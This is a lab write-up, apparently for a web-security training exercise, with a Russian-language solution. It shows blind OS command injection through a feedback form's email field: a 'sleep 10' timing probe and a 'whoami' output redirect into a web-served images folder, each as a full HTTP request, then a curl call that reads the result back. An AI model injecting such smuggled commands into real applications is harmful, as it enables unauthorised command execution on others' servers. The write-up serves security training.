# Blind OS command injection with output redirection
PRACTITIONER

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

`/var/www/images/`

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the whoami command and retrieve the output.

## Решение
Добавляю `; seep 10;` к параметру email:
```
POST /feedback/submit HTTP/2
Host: 0ab300bf04b97503817f07f0008f0067.web-security-academy.net
Cookie: session=6fasxJ29QaULAlayoPrcoHQtAXWQnw6r
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 106
Origin: https://0ab300bf04b97503817f07f0008f0067.web-security-academy.net
Referer: https://0ab300bf04b97503817f07f0008f0067.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

csrf=jHUc6enqayosod4Rktj2siTjk4pKaWoc&name=test&email=test%40server.com; sleep 10;&subject=foo&message=bar
```
Запрос выполняется на 10 секунд дольше обычного. Хорошо, параметр email уязвим к cmdi.

Добавляю к значению параметра email следующий текст:

`; whoami > /var/www/images/x1.jpg;`
```
POST /feedback/submit HTTP/2
Host: 0ab300bf04b97503817f07f0008f0067.web-security-academy.net
Cookie: session=6fasxJ29QaULAlayoPrcoHQtAXWQnw6r
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 129
Origin: https://0ab300bf04b97503817f07f0008f0067.web-security-academy.net
Referer: https://0ab300bf04b97503817f07f0008f0067.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

csrf=jHUc6enqayosod4Rktj2siTjk4pKaWoc&name=test&email=test%40server.com; whoami > /var/www/images/x1.jpg;&subject=foo&message=bar
```
```
┌──(tinker㉿catpants)-[~/projects]
└─$ curl https://0ab300bf04b97503817f07f0008f0067.web-security-academy.net/image?filename=x1.jpg
peter-eD0elg

```
Задание выполнено.
